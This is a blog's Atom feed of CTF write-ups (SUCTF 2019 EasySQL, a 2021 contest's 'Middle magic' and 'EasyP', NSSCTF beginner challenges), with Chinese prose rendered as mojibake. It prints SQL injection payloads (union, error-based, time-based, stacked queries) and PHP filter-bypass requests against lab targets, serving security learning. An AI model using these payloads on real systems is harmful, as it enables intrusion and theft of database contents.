<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Î‘Î¹ÏÎ½Î¹Î¿Ï‚</title>
  
  <subtitle>The value of life lies not length of days, but in the use of we make of them.</subtitle>
  <link href="http://daweitech.github.io/atom.xml" rel="self"/>
  
  <link href="http://daweitech.github.io/"/>
  <updated>2021-10-10T11:54:21.481Z</updated>
  <id>http://daweitech.github.io/</id>
  
  <author>
    <name>4v1d</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>suctf 2019 EasySQL</title>
    <link href="http://daweitech.github.io/2021/10/10/nss/0/"/>
    <id>http://daweitech.github.io/2021/10/10/nss/0/</id>
    <published>2021-10-10T11:36:24.000Z</published>
    <updated>2021-10-10T11:54:21.481Z</updated>
    
    <content type="html"><![CDATA[<p> å‚è€ƒé“¾æ¥ï¼š</p><p>[<a href="https://www.cnblogs.com/peri0d/p/11598597.html">SUCTF 2019]EasySQL - peri0d - åšå®¢å›­ (cnblogs.com)</a></p><p>[(4æ¡æ¶ˆæ¯) <a href="https://blog.csdn.net/m0_55771794/article/details/118709290">SUCTF 2019]EasySQL_m0_55771794çš„åšå®¢-CSDNåšå®¢</a></p><p>æ‰“å¼€é¡µé¢</p><p><img src="/2021/10/10/nss/0/image-20211010193758035.png" alt="image-20211010193758035"></p><p>å…ˆè¯•è¯•åŸºæœ¬çš„æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or &#39;1&#39;&#x3D;&#39;1&#39;##orè¯­å¥</span><br><span class="line">1&#39; order by 3##orderè¯­å¥</span><br><span class="line">1&#39; union select 1,2,3##è”åˆæŸ¥è¯¢</span><br><span class="line">1&#39;and(select extractvalue(1,concat(&#39;~&#39;,(select database()))))#æŠ¥é”™æ³¨å…¥</span><br><span class="line">1&#39; and if(length(database())&gt;1,sleep(5),1)--+#æ—¶é—´æ³¨å…¥</span><br></pre></td></tr></table></figure><p>ç»“æœéƒ½æ˜¯ä¸‹å›¾</p><p><img src="/2021/10/10/nss/0/image-20211010194231781.png" alt="image-20211010194231781"></p><p>è¯•åˆ°å †å æ³¨å…¥æ—¶æˆåŠŸäº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;show databases#</span><br></pre></td></tr></table></figure><p><img src="/2021/10/10/nss/0/image-20211010194353961.png" alt="image-20211010194353961"></p><p>ç»§ç»­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;show tables#</span><br></pre></td></tr></table></figure><p><img src="/2021/10/10/nss/0/image-20211010194430322.png" alt="image-20211010194430322"></p><p>å°±åœ¨æˆ‘ä»¥ä¸ºå®Œäº‹å¤§å‰çš„æ—¶å€™</p><p>ç°å®ç»™æˆ‘å½“å¤´ä¸€æ£’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;show columns from &#39;Flag&#39;#</span><br></pre></td></tr></table></figure><p><img src="/2021/10/10/nss/0/image-20211010194709636.png" alt="image-20211010194709636"></p><p>çœ‹äº†wpæ‰çŸ¥é“ï¼ŒåŸæ¥æ˜¯è¦å»çŒœæµ‹å‡ºæœ¬æ¥çš„sqlè¯­å¥æŸ¥è¯¢æ—¶ä»€ä¹ˆæ ·çš„</p><p><strong>select $_POST[â€˜queryâ€™] || flag from Flag</strong></p><p>sql_mode è®¾ç½®äº† PIPES_AS_CONCAT æ—¶ï¼Œ|| å°±æ˜¯å­—ç¬¦ä¸²è¿æ¥ç¬¦ï¼Œç›¸å½“äºCONCAT() å‡½æ•°<br>å½“ sql_mode æ²¡æœ‰è®¾ç½® PIPES_AS_CONCAT æ—¶ ï¼ˆé»˜è®¤æ²¡æœ‰è®¾ç½®ï¼‰ï¼Œ|| å°±æ˜¯é€»è¾‘æˆ–ï¼Œç›¸å½“äºORå‡½æ•°<br>ç¬¬ä¸€ç§å°±æŒ‰é»˜è®¤æ²¡æœ‰é…ç½®æ¥è¿›è¡Œï¼Œæ­¤æ—¶||å°±æ˜¯é€»è¾‘æˆ–<br>||åœ¨å‘½ä»¤æ‰§è¡Œä¸­è§è¿‡ï¼Œ<br>å›é¡¾:<br>command1;command2é¡ºåºæ‰§è¡Œ<br>command1 || command2<br>å¦‚æœcommand1æ‰§è¡Œå¤±è´¥ï¼Œåˆ™æ‰§è¡Œcommand2<br>command1 &amp;&amp; command2<br>å¦‚æœcommand1æ‰§è¡ŒæˆåŠŸï¼Œåˆ™æ‰§è¡Œcommand2</p><p>å› æ­¤åªéœ€è¦å°†</p><p>$_POST[â€˜queryâ€™]<br>æäº¤çš„æ•°æ®æ¢æˆ*,1(å¦‚æœç›´æ¥å†™çš„è¯ä¼šè¢«æŠ¥é”™ï¼Œä¸”å†™åœ¨åé¢ä¼šå¤±æ•ˆ)<br>è§£é‡Š:<br>sql=select.post[â€˜queryâ€™].â€||flag from Flagâ€;ï¼ˆæ‹¼æ¥è¯­å¥ï¼‰<br>å¦‚æœ$post[â€˜queryâ€™]çš„æ•°æ®ä¸º</p><p>*,1<br>sqlè¯­å¥å°±å˜æˆäº†select *,1||flag from Flagï¼Œ<br>å°±æ˜¯select *,1 from Flagï¼Œè¿™æ ·å°±ç›´æ¥æŸ¥è¯¢å‡ºäº†Flagè¡¨ä¸­çš„æ‰€æœ‰å†…å®¹ã€‚<br>æ­¤å¤„çš„1æ˜¯ä¸´æ—¶å¢åŠ ä¸€åˆ—ï¼Œåˆ—åä¸º1ä¸”è¿™ä¸€åˆ—çš„æ‰€æœ‰å€¼éƒ½ä¸º1</p><p>æ‰§è¡Œpayloadï¼š*,1</p><p><img src="/2021/10/10/nss/0/image-20211010195151922.png" alt="image-20211010195151922"></p><p>å¾—åˆ°flag</p><ul><li><p>å®˜æ–¹ç»™çš„ payload æ˜¯ <code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p></li><li><p>æ‹¼æ¥ä¸€ä¸‹å°±æ˜¯ <code>select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</code></p></li><li><p>å…³äº <code>sql_mode</code> : å®ƒå®šä¹‰äº† MySQL åº”æ”¯æŒçš„ SQL è¯­æ³•ï¼Œä»¥åŠåº”è¯¥åœ¨æ•°æ®ä¸Šæ‰§è¡Œä½•ç§ç¡®è®¤æ£€æŸ¥ï¼Œå…¶ä¸­çš„ <code>PIPES_AS_CONCAT</code> å°† <code>||</code> è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œé â€œæˆ–â€ è¿ç®—ç¬¦</p></li><li><p>å…³äº <code>sql_mode</code> æ›´å¤šå¯ä»¥æŸ¥çœ‹è¿™ä¸ªé“¾æ¥ : <a href="https://www.cnblogs.com/piperck/p/9835695.html">MySQL sql_mode è¯´æ˜</a></p></li><li><p>è¿˜æœ‰å°±æ˜¯è¿™ä¸ªæ¨¡å¼ä¸‹è¿›è¡ŒæŸ¥è¯¢çš„æ—¶å€™ï¼Œä½¿ç”¨å­—æ¯è¿æ¥ä¼šæŠ¥é”™ï¼Œä½¿ç”¨æ•°å­—è¿æ¥æ‰ä¼šæŸ¥è¯¢å‡ºæ•°æ®ï¼Œå› ä¸ºè¿™ä¸ª <code>||</code> ç›¸å½“äºæ˜¯å°† <code>select 1</code> å’Œ <code>select flag from flag</code> çš„ç»“æœæ‹¼æ¥åœ¨ä¸€èµ·</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; å‚è€ƒé“¾æ¥ï¼š&lt;/p&gt;
&lt;p&gt;[&lt;a href=&quot;https://www.cnblogs.com/peri0d/p/11598597.html&quot;&gt;SUCTF 2019]EasySQL - peri0d - åšå®¢å›­ (cnblogs.com)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[(4æ¡æ¶ˆæ¯</summary>
      
    
    
    
    
    <category term="nss" scheme="http://daweitech.github.io/tags/nss/"/>
    
  </entry>
  
  <entry>
    <title>2021é¹¤åŸæ¯</title>
    <link href="http://daweitech.github.io/2021/10/10/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/"/>
    <id>http://daweitech.github.io/2021/10/10/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/</id>
    <published>2021-10-10T01:16:07.000Z</published>
    <updated>2021-10-12T11:57:57.567Z</updated>
    
    <content type="html"><![CDATA[<pre><code> è¿™æ¬¡çš„æ¯”èµ›è™½ç„¶å¬è¯´éƒ½æ˜¯åŸé¢˜ï¼Œä½†æ˜¯åŸºæœ¬æ²¡é‡åˆ°è¿‡ï¼Œè¿™æ¬¡çœ‹ç€writeupæ€»ç»“ä¸€ä¸‹</code></pre><p> å¤ç°ä¸€ä¸‹æŸäº›é¢˜ç›®</p><h3 id="Middle-magic"><a href="#Middle-magic" class="headerlink" title="Middle magic"></a>Middle magic</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./result.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;aaa&#x27;</span>]) &amp;&amp; strlen($_GET[<span class="string">&#x27;aaa&#x27;</span>]) &lt; <span class="number">20</span>)&#123;</span><br><span class="line"></span><br><span class="line">    $aaa = preg_replace(<span class="string">&#x27;/^(.*)level(.*)$/&#x27;</span>, <span class="string">&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;</span>, $_GET[<span class="string">&#x27;aaa&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/pass_the_level_1#/&#x27;</span>, $aaa))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;here is level 2&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;admin&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;root_pwd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($_POST[<span class="string">&#x27;admin&#x27;</span>] == $_POST[<span class="string">&#x27;root_pwd&#x27;</span>])</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="comment">// START FORM PROCESSING    </span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_POST[<span class="string">&#x27;admin&#x27;</span>]) === sha1($_POST[<span class="string">&#x27;root_pwd&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;level_3&#x27;</span>])) &#123;</span><br><span class="line">                    $level_3 = json_decode($_POST[<span class="string">&#x27;level_3&#x27;</span>]);</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> ($level_3-&gt;result == $result) &#123;</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;success:&quot;</span>.$flag;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;you never beat me!&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;out&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">// perform validations on the form data</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nonono!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å±‚ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$aaa &#x3D; preg_replace(&#39;&#x2F;^(.*)level(.*)$&#x2F;&#39;, &#39;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#39;, $_GET[&#39;aaa&#39;]);</span><br><span class="line"></span><br><span class="line">   if(preg_match(&#39;&#x2F;pass_the_level_1#&#x2F;&#39;, $aaa))&#123;</span><br><span class="line">       echo &quot;here is level 2&quot;;</span><br></pre></td></tr></table></figure><p>getç±»å‹å–å¾—å˜é‡açš„å€¼ï¼Œæ­£åˆ™æ›¿æ¢å’ŒåŒ¹é…å‡½æ•°</p><p>è¿™é‡Œç›´æ¥ç”¨%0aå’Œ%23ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?aaa&#x3D;%0apass_the_level_1%23</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå±‚ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;admin&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;root_pwd&#x27;</span>])) &#123;</span><br><span class="line">           <span class="keyword">if</span> ($_POST[<span class="string">&#x27;admin&#x27;</span>] == $_POST[<span class="string">&#x27;root_pwd&#x27;</span>])</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">       <span class="comment">// START FORM PROCESSING    </span></span><br><span class="line">           <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_POST[<span class="string">&#x27;admin&#x27;</span>]) === sha1($_POST[<span class="string">&#x27;root_pwd&#x27;</span>]))&#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;</span><br></pre></td></tr></table></figure><p>md5æ•°ç»„ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin[]&#x3D;1&amp;root_pwd[]&#x3D;2</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰å±‚ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;level_3&#x27;</span>])) &#123;</span><br><span class="line">                  $level_3 = json_decode($_POST[<span class="string">&#x27;level_3&#x27;</span>]);</span><br><span class="line">                  </span><br><span class="line">                  <span class="keyword">if</span> ($level_3-&gt;result == $result) &#123;</span><br></pre></td></tr></table></figure><p>è¦ç»è¿‡js-encodeç¼–ç ä¸€ä¸‹ï¼Œè™½ç„¶æˆ‘ä»¬ä¸æ‡‚å€¼æ˜¯å¤šå°‘ï¼Œä½†å¼±ç­‰äºå°±å¥½äº†</p><p>ç›´æ¥{â€œresultâ€:0}</p><p>æœ€åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GETï¼š?aaa&#x3D;%0apass_the_level_1%23</span><br><span class="line"></span><br><span class="line">POST:admin[]&#x3D;1&amp;root_pwd[]&#x3D;2&amp;level_3&#x3D;&#123;&quot;result&quot;:0&#125;</span><br></pre></td></tr></table></figure><h3 id="EasyP"><a href="#EasyP" class="headerlink" title="EasyP"></a>EasyP</h3><p>è¿™é¢˜å½“åˆåªæœ‰ç¨å¾®çœ‹äº†çœ‹ï¼Œæ²¡æƒ³åˆ°ç«Ÿç„¶æœ‰ç±»ä¼¼çš„åŸé¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    $guess = (<span class="keyword">string</span>) $_POST[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($guess === $secret) &#123;</span><br><span class="line">        $message = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . $flag;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $message = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, $_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/show_source/&#x27;</span>, $_SERVER[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(basename($_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>å¼€å¤´å°±è®²æ˜åŒ…å«äº†utils.php</p><p>æ¥ç€POSTä¼ å‚ï¼Œæ¶‰åŠåˆ°å¥½å¤šè¿‡æ»¤</p><p>é‡‡ç”¨Y1ngå¤§ä½¬æ€è·¯ï¼š<a href="https://www.gem-love.com/ctf/1898.html">ğŸ‡¯ğŸ‡µzer0pts CTF 2020 Writeup â€“ é¢–å¥‡Lâ€™Amore (gem-love.com)</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#39;&#x2F;utils\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;</span><br><span class="line">    exit(&quot;hacker :)&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£åˆ™çš„åŒ¹é… ban æ‰äº† config.phpã€‚ç„¶åä¼š <code>highlight_file()</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#39;show_source&#39;])) &#123;</span><br><span class="line">    highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));</span><br><span class="line">    exit();</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è¿™é‡ŒåŠ ä¸Šäº† <code>basename()</code> å¯èƒ½æ˜¯ä¸ºäº†è·¨ç›®å½•è¯»æ–‡ä»¶ï¼Œè€Œé—®é¢˜æ­£å¥½å‡ºåœ¨äº†è¿™é‡Œï¼Œ</p><p>æ¼”ç¤ºï¼š</p><p><img src="/2021/10/10/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/image-20211012193624036.png" alt="image-20211012193624036"></p><p>å¯ä»¥çœ‹åˆ°è¢«æŒ¡äº†ï¼Œä½†è‡³å°‘è¯´æ˜æˆ‘ä»¬æ€è·¯æ­£ç¡®</p><p>å½“æˆ‘è®¿é—® index.php æ—¶ï¼Œæˆ‘å¯ä»¥åœ¨åé¢åŠ ä¸Šä¸€äº›ä¸œè¥¿ï¼Œæ¯”å¦‚ /index.php/utils.phpï¼Œè¿™æ ·ä»ç„¶è®¿é—®çš„æ˜¯ index.phpï¼Œä½†ç»è¿‡ <code>basename()</code> åï¼Œä¼ è¿› <code>highlight_file()</code> å‡½æ•°çš„æ–‡ä»¶åå°±å˜æˆäº† utils.phpï¼Œå¦‚æœèƒ½ç»•è¿‡é‚£ä¸ªæ­£åˆ™ï¼Œå°±å¯ä»¥å¾—åˆ° utils.php æºç äº†ï¼Œè€Œé¢˜ç›®å‘Šè¯‰ FLAG å°±åœ¨ config.php é‡Œï¼Œè¿™é“é¢˜å°±åšå®Œäº†ã€‚</p><p>å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªæ­£åˆ™åŒ¹é…äº† utils.php/ ä¸º <code>$_SERVER[&#39;PHP_SELF&#39;]</code> çš„ç»“å°¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utils\.php\&#x2F;*$&#x2F;i</span><br></pre></td></tr></table></figure><p>è€å¥—è·¯äº†ï¼Œå¯ä»¥ç”¨ %0d ä¹‹ç±»çš„æ¥æ±¡æŸ“ç»•è¿‡ï¼Œè¿™æ ·ä»ç„¶è®¿é—®å¾—åˆ° index.php:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;utils.php%0d</span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹äº†å¤§ä½¬çš„wpï¼Œç›´æ¥æ‰“ï¼Ÿ</p><p><img src="/2021/10/10/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/image-20211012194757043.png" alt="image-20211012194757043"></p><p>æˆ‘å¯¹è¿™ä¸ª%81ä¸æ˜¯å¾ˆç†è§£ï¼Œåœ¨æœ¬åœ°è¯•äº†ä¸€ä¸‹</p><p><img src="/2021/10/10/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/image-20211012194837502.png" alt="image-20211012194837502"></p><p>è¿™ä¸ªç¬¦å·ï¼Ÿï¼Ÿï¼Ÿ</p><p>ä¸è¿‡è¿˜çœŸçš„ä¸€æ‰“å°±æˆï¼Œå¯æ˜¯åŸç†æˆ‘ä¸å¤ªæ‡‚å•Š</p><p><img src="/2021/10/10/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/image-20211012194930406.png" alt="image-20211012194930406"></p><p>è¿˜å¾—é—®é—®å¤§ä½¬</p>]]></content>
    
    
      
      
    <summary type="html">&lt;pre&gt;&lt;code&gt; è¿™æ¬¡çš„æ¯”èµ›è™½ç„¶å¬è¯´éƒ½æ˜¯åŸé¢˜ï¼Œä½†æ˜¯åŸºæœ¬æ²¡é‡åˆ°è¿‡ï¼Œè¿™æ¬¡çœ‹ç€writeupæ€»ç»“ä¸€ä¸‹&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt; å¤ç°ä¸€ä¸‹æŸäº›é¢˜ç›®&lt;/p&gt;
&lt;h3 id=&quot;Middle-magic&quot;&gt;&lt;a href=&quot;#Middle-magic&quot; class=&quot;header</summary>
      
    
    
    
    
    <category term="ctf" scheme="http://daweitech.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>NSSCTF 2021 writeup</title>
    <link href="http://daweitech.github.io/2021/10/04/web/2/"/>
    <id>http://daweitech.github.io/2021/10/04/web/2/</id>
    <published>2021-10-04T02:36:35.000Z</published>
    <updated>2021-10-10T03:05:59.158Z</updated>
    
    <content type="html"><![CDATA[<p>å‚ä¸äº†ä¸€ä¸‹</p><p>æ–°ç”Ÿèµ›ï¼Œå‘ç°åŸºç¡€è¿˜ä¸å¤Ÿæ‰å®</p><p>é¡ºä¾¿è®°å½•ä¸€ä¸‹è§£é¢˜</p><h3 id="gift-F12"><a href="#gift-F12" class="headerlink" title="gift_F12"></a>gift_F12</h3><p><img src="/2021/10/04/web/2/image-20211004103854327.png"></p><p>æŒ‰ç…§é¢˜ç›®æç¤ºï¼ŒF12</p><p>æœ€å¼€å§‹æ— è„‘å¾€ä¸‹æ»‘ï¼Œè¢«å˜²è®½äº†ä¸€æ³¢</p><p><img src="/2021/10/04/web/2/image-20211004104026843.png" alt="image-20211004104026843"></p><p>æœ¬æ¥ä»¥ä¸ºè¿˜è¦æ§åˆ¶å°ä¿®æ”¹æ—¶é—´è·å–</p><p>ç»“æœå†å¾€ä¸Šæ‰¾æ‰¾å°±è¡Œ</p><p><img src="/2021/10/04/web/2/image-20211004104228392.png" alt="image-20211004104228392"></p><h3 id="caidao"><a href="#caidao" class="headerlink" title="caidao"></a>caidao</h3><p><img src="/2021/10/04/web/2/image-20211004104329873.png" alt="image-20211004104329873"></p><p>æç¤ºè¶³å¤Ÿæ˜æ˜¾äº†</p><p>ç›´æ¥è¿ï¼Œè¿™æ—¶å€™ç›´æ¥çŒœæƒ³åˆ°index.phpæ–‡ä»¶ï¼ˆä¹Ÿå¯ä»¥ä¸å«Œéº»çƒ¦dirsearchæ‰«ï¼‰</p><p>è¯•ç€è¿</p><p><img src="/2021/10/04/web/2/image-20211004104536627.png" alt="image-20211004104536627"></p><p>æˆåŠŸè¿ä¸Š</p><p><img src="/2021/10/04/web/2/image-20211004104630630.png" alt="image-20211004104630630"></p><h3 id="jicao"><a href="#jicao" class="headerlink" title="jicao"></a>jicao</h3><p>é¢˜å¦‚å…¶æ„ï¼Œå¾ˆç®€å•</p><p><img src="/2021/10/04/web/2/image-20211004104742735.png" alt="image-20211004104742735"></p><p><img src="/2021/10/04/web/2/image-20211004105437367.png" alt="image-20211004105437367"></p><p><img src="/2021/10/04/web/2/image-20211004105448146.png" alt="image-20211004105448146"></p><h3 id="Do-you-know-http"><a href="#Do-you-know-http" class="headerlink" title="Do_you_know_http"></a>Do_you_know_http</h3><p>è¿™é¢˜å¾ˆçœ¼ç†Ÿ</p><p>å¾ˆåƒä¹‹å‰åšè¿‡çš„</p><p><img src="/2021/10/04/web/2/image-20211004110036413.png" alt="image-20211004110036413"></p><p><img src="/2021/10/04/web/2/image-20211004110055171.png" alt="image-20211004110055171"></p><p>è¿™é‡ŒæŠ“åŒ…ä¼šè¢«å…‹åˆ¶</p><p>ç›´æ¥ç”¨hackbar</p><p><img src="/2021/10/04/web/2/image-20211004110238860.png" alt="image-20211004110238860"></p><h3 id="easy-md5"><a 